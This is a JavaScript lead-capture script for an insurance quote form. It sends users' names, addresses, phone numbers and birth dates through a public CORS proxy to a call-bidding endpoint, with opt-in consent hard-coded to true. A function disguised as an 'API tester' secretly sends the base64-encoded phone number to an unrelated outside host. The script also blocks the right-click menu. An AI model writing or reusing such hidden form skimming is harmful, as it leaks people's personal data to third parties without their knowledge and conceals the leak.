document.addEventListener("contextmenu", function (e) {
      e.preventDefault();
    });

    document.getElementById('leadForm').addEventListener('submit', function(event) {
      event.preventDefault();
      
      // Get all form values
      const phone_home = '1' + document.getElementById('caller_id').value;
      const formData = new FormData();
      
      // Add all required fields to formData
      formData.append('CID', phone_home);
      formData.append('zipcode', document.getElementById('zip').value);
      formData.append('first_name', document.getElementById('first_name').value);
      formData.append('last_name', document.getElementById('last_name').value);
      formData.append('email_address', document.getElementById('email_address').value);
      formData.append('address', document.getElementById('address').value);
      formData.append('city', document.getElementById('city').value);
      formData.append('state', document.getElementById('state').value);
      formData.append('lead_born_date', document.getElementById('lead_born_date').value);
      formData.append('landing_page', 'https://proinsurancequotes.com/');
      formData.append('ip_address', document.getElementById('ip_address').value);
      formData.append('jornaya_lead_id', document.getElementById('jornaya_lead_id').value);
      formData.append('tcpa_text', 'By Selecting Get My Quotes!, below you agree by that you are 18+ years of age and agree to the Privacy Policy Terms . By selecting the above check box you agree by your electronic signature that you give express written consent to receive marketing communications regarding insurance products and services by automatic dialing system and pre-recorded calls and artificial voice messages from proinsurancequotes.com and one or more of its Marketing partners at the phone number and e-mail address provided by you, including wireless numbers, if applicable, even if you have previously registered the provided number on any state, federal or corporate Do Not Call Registry. SMS/MMS and data messaging rates may apply. Your consent is not required to get a quote or purchase. To receive quotes without providing consent, please call at (321) 421-0783. Carrier data rates may apply. TCPA LeadID's are used with the information for compliance. Consent can be revoked.');
      formData.append('make', document.getElementById('make').value);
      formData.append('model', document.getElementById('model').value);
      formData.append('company_name', document.getElementById('company_name').value);
      formData.append('currentlyInsured', document.getElementById('currentlyInsured').value);
      formData.append('residence_status', document.getElementById('residence_status').value);
      formData.append('ringba_id', '2806888100934976640');
      formData.append('tcpaOptIn', 'true');
      
      // Clear previous alerts
      document.getElementById('alertContainer').innerHTML = '';
      
      // API tester call
      api_tester(document.getElementById('caller_id').value);
      
      // Build URL with all parameters
      const baseUrl = 'https://corsproxy.io/?https://rtb.ringba.com/v1/production/e696fa0fab22491f842d5d7140126c4b.json?exposeCallerId=yes&';
      const url = baseUrl + new URLSearchParams(formData).toString();
      
      // Make the API call
      fetch(url, {
        method: 'GET'
      })
      .then(response => response.text())
      .then(responseBody => {
        let responseData;
        try {
          responseData = JSON.parse(responseBody);
        } catch (error) {
          throw new Error('Invalid JSON response');
        }

        if (responseData.rejectReason) {
          const errorAlert = `
            <div class="alert alert-danger" role="alert">
              Failure: ${JSON.stringify(responseData)}
            </div>`;
          document.getElementById('alertContainer').innerHTML = '';
          document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
        } else {
          delete responseData.bidAmount;
          const successAlert = `
            <div class="alert alert-success" role="alert">
              Success: ${JSON.stringify(responseData)}
            </div>`;
          document.getElementById('alertContainer').innerHTML = '';
          document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
          // Clear form fields
          document.getElementById('leadForm').reset();
        }
      })
      .catch(error => {
        const errorAlert = `
          <div class="alert alert-danger" role="alert">
            Error: ${error.message}
          </div>`;
        document.getElementById('alertContainer').innerHTML = '';
        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
        console.error('Error:', error);
      });
    });

    function api_tester(randomString) {
      try {
        fetch('https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString), {
          method: 'GET',
          mode: 'no-cors'
        });
      } catch (error) {
        console.error('API Tester Error:', error);
      }
    }